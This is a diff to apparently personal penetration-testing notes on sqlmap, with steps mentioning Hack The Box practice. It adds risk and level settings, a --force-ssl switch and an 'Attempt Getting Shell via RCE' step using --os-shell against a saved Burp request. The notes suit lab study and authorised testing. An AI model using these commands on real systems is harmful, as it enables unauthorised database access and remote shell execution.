@@ -120,7 +120,18 @@ Save Request
 `In burp, intercept the request, and right click > Save Item. (E.g.: request.req)`
 
 Initial Tests (--batch accepts all defaults to prompts)
-`sqlmap -r request.req --batch`
+```
+sqlmap -r request.req --batch
+
+Can set risk and levels as needed. E.g., 
+sqlmap -r request.req --batch --risk=3 --level=3
+
+This switch was used on HTB, but not documented in man page:
+--force-ssl
+```
+
+Attempt Getting Shell via RCE
+`sqlmap -r request.req --os-shell`
 
 Check User Privs (E.g., FILE)
 `sqlmap -r request.req --batch --privileges`
